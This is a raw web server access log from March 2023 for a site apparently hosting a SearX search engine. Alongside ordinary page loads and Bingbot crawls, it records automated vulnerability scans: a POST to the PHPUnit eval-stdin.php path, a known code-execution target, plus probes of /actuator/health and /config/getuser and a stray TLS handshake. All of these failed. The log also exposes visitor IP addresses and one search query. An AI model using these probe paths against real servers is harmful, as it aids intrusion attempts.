46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/themes/oscar/js/typeahead.bundle.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/themes/oscar/js/bootstrap.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/themes/oscar/css/bootstrap.min.css HTTP/1.1" 200 125509 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/themes/oscar/js/searx.min.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:33 +0000] "GET /searx/static/plugins/js/search_on_category_select.js HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
46.193.1.170 - - [23/Mar/2023:18:28:40 +0000] "GET /searx/autocompleter?q=business%20idea%20pitch%20talking%20about%20the%20concurrence HTTP/1.1" 200 2 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0"
40.77.167.220 - - [23/Mar/2023:18:28:56 +0000] "GET / HTTP/1.1" 200 1029 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.94 - - [23/Mar/2023:18:49:46 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
107.170.228.17 - - [23/Mar/2023:19:03:14 +0000] "GET /actuator/health HTTP/1.1" 404 125 "-" "Mozilla/5.0 zgrab/0.x"
194.55.224.203 - - [23/Mar/2023:19:25:40 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
143.110.222.166 - - [23/Mar/2023:19:27:01 +0000] "GET / HTTP/1.1" 200 415740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
40.77.167.203 - - [23/Mar/2023:19:35:41 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
40.77.167.203 - - [23/Mar/2023:19:35:42 +0000] "GET /robots.txt HTTP/1.1" 404 188 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
152.89.196.54 - - [23/Mar/2023:19:38:02 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.11.61.195 - - [23/Mar/2023:19:44:10 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 157 "-" "-"
152.89.196.54 - - [23/Mar/2023:19:51:05 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.118.53.210 - - [23/Mar/2023:20:00:01 +0000] "GET / HTTP/1.1" 200 1583 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
157.55.39.208 - - [23/Mar/2023:20:07:37 +0000] "GET / HTTP/1.1" 200 865 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
139.170.202.7 - - [23/Mar/2023:20:23:03 +0000] "GET / HTTP/1.1" 200 415700 "-" "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
139.170.202.7 - - [23/Mar/2023:20:23:04 +0000] "GET /ajax-setup?1679602759700 HTTP/1.1" 200 75 "http://www.pseudot.org/" "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
123.245.25.248 - - [23/Mar/2023:20:23:04 +0000] "GET /interface-data/init?1679602759740 HTTP/1.1" 401 0 "http://www.pseudot.org/" "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"
